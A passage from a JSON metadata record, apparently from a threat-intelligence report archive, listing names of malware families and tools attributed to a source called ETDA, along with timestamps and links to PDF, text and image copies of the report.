                "Zekapab",
                "carberplike",
                "certutil",
                "certutil.exe",
                "fysbis",
                "webhp"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673536006,
    "ts_updated_at": 1743041831,
    "ts_creation_date": 1653713410,
    "ts_modification_date": 1653713410,
    "files": {
        "pdf": "https://archive.orkl.eu/5ce06bd4361d2f8b8145923c74281f71adaec827.pdf",
        "text": "https://archive.orkl.eu/5ce06bd4361d2f8b8145923c74281f71adaec827.txt",
        "img": "https://archive.orkl.eu/5ce06bd4361d2f8b8145923c74281f71adaec827.jpg"
    }
}